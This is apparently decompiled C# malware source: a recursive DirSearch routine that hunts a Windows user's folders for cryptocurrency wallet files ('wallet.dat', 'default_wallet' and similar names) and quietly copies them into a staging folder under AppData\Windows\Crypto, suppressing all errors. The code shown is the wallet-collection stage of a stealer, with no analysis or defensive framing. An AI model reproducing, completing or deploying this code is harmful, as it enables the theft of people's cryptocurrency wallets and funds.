using System;
using System.IO;

namespace cr
{
	// Token: 0x0200000E RID: 14
	internal class crypto
	{
		// Token: 0x0600001D RID: 29 RVA: 0x00003BC4 File Offset: 0x00001DC4
		public static void DirSearch(string sDir)
		{
			try
			{
				string[] directories = Directory.GetDirectories(sDir);
				int i = 0;
				while (i < directories.Length)
				{
					string text = directories[i];
					try
					{
						bool flag = text == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
						if (flag)
						{
							goto IL_234;
						}
						bool flag2 = text == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Application Data";
						if (flag2)
						{
							goto IL_234;
						}
						bool flag3 = text == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\History";
						if (flag3)
						{
							goto IL_234;
						}
						bool flag4 = text == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft";
						if (flag4)
						{
							goto IL_234;
						}
						bool flag5 = text == Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temporary Internet Files";
						if (flag5)
						{
							goto IL_234;
						}
						string[] files = Directory.GetFiles(text);
						string[] array = files;
						int j = 0;
						while (j < array.Length)
						{
							string text2 = array[j];
							FileInfo fileInfo = new FileInfo(text2);
							bool flag6 = fileInfo.Name == "wallet.dat" || fileInfo.Name == "wallet" || fileInfo.Name == "default_wallet.dat" || fileInfo.Name == "default_wallet" || fileInfo.Name.EndsWith("wallet") || fileInfo.Name.EndsWith("bit") || fileInfo.Name.StartsWith("wallet");
							if (flag6)
							{
								Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Crypto");
								try
								{
									bool flag7 = fileInfo.Name.EndsWith(".log");
									if (!flag7)
									{
										string name = new DirectoryInfo(text).Name;
										Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Crypto\\" + name);
										File.Copy(text2, string.Concat(new string[]
										{
											Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
											"\\Windows\\Crypto\\",
											name,
											"\\",
											fileInfo.Name
										}));
									}
								}
								catch
								{
								}
							}
							IL_213:
							j++;
							continue;
							goto IL_213;
						}
					}
					catch
					{
					}
					goto IL_22C;
					IL_234:
					i++;
					continue;
					IL_22C:
					crypto.DirSearch(text);
					goto IL_234;
				}
			}
			catch
			{
			}
		}
	}
}
